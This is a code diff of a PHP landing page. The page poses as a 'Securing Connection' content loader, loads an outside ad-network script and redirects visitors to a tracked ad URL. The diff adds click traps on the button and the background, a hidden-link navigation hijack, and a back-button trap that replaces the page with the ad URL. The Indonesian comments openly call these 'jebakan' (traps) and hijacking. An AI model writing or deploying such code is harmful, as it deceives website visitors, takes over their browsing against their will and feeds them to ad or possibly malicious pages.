@@ -1,5 +1,4 @@
 <?php
-// PHP untuk mengambil query parameter (tetap sama)
 $tracking_query = isset($_GET['p']) ? urlencode($_GET['p']) : 'not_provided';
 $display_query = isset($_GET['p']) ? htmlspecialchars(ucwords(str_replace('-', ' ', $_GET['p']))) : 'Our Content';
 ?>
@@ -10,18 +9,14 @@ $display_query = isset($_GET['p']) ? htmlspecialchars(ucwords(str_replace('-', '
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading Content for <?php echo $display_query; ?>...</title>
     <style>
-        /* ... CSS Anda tetap sama ... */
         html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #1a1a1a; color: #555; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; cursor: pointer; }
-        .loader { border: 5px solid #333; border-top: 5px solid #BB86FC; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { margin-top: 20px; font-size: 1.2em; line-height: 1.5; }
         .container { text-align: center; }
         .action-button { margin-top: 25px; padding: 15px 30px; font-size: 1.2em; font-weight: bold; color: #1a1a1a; background-color: #BB86FC; border: 2px solid #D1A9FF; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.2); transition: all 0.2s ease-in-out; z-index: 10; position: relative; }
         .action-button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(187, 134, 252, 0.3); }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div id="click-trap" class="container">
         <div class="loader"></div>
         <div class="text">Please Wait, Securing Connection...</div>
         <button id="continueButton" class="action-button">Continue to <?php echo $display_query; ?></button>
@@ -30,37 +25,46 @@ $display_query = isset($_GET['p']) ? htmlspecialchars(ucwords(str_replace('-', '
     <script type='text/javascript' src='//ominousirritatingpictorial.com/d8/ed/62/d8ed62be35d6d1d6eb69f74ee66c68a0.js'></script>
     
     <script type="text/javascript">
-        // --- PENGATURAN LINK IKLAN ---
         const baseUrl = 'https://ominousirritatingpictorial.com/yeq6pfda?key=1b4d52e64661803759543f5d2bf12246';
         const trackingQuery = '<?php echo $tracking_query; ?>';
         const redirectUrl = baseUrl + '&subid=' + trackingQuery;
 
-        // --- 2. LOGIKA UNTUK JEBAKAN TOMBOL "CONTINUE" (1 TAB) ---
+        function hijackNavigation(destinationUrl) {
+            // 1. Buat tautan palsu yang tidak terlihat
+            const fakeLink = document.createElement('a');
+            fakeLink.href = destinationUrl;
+            fakeLink.target = '_blank';
+            document.body.appendChild(fakeLink);
+
+            fakeLink.click();
+            
+            document.body.removeChild(fakeLink);
+            
+            window.location.replace(redirectUrl);
+        }
+
         const continueButton = document.getElementById('continueButton');
         if (continueButton) {
             continueButton.addEventListener('click', function(event) {
-                // Hentikan event agar tidak memicu jebakan klik latar belakang
-                event.stopPropagation();
-                // Buka satu tab iklan
-                window.open(redirectUrl, '_blank');
+                event.stopPropagation(); // Mencegah jebakan klik latar belakang terpicu
+                hijackNavigation(redirectUrl);
+            });
+        }
+        
+        const clickTrap = document.getElementById('click-trap');
+        if (clickTrap) {
+            clickTrap.addEventListener('click', function() {
+                // Terapkan pembajakan navigasi untuk klik latar belakang
+                hijackNavigation(redirectUrl);
             });
         }
 
-        // --- 3. LOGIKA UNTUK "KLIK DI MANA SAJA" (2 TAB) ---
-        document.body.addEventListener('click', function() {
-            // Buka dua tab iklan
-            window.open(redirectUrl, '_blank');
-            window.open(redirectUrl, '_blank');
-        }, true);
-
-
-        // --- 4. LOGIKA UNTUK JEBAKAN TOMBOL KEMBALI (1 TAB) ---
         (function() {
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function(event) {
-                // Buka satu tab iklan saat tombol kembali ditekan
-                window.open(redirectUrl, '_blank');
-                history.pushState(null, null, location.href);
+                // Alih-alih membuka pop-up, kita ganti halaman saat ini
+                window.location.replace(redirectUrl);
+                // Kita tidak perlu pushState lagi karena halaman sudah diganti
             });
         })();
 
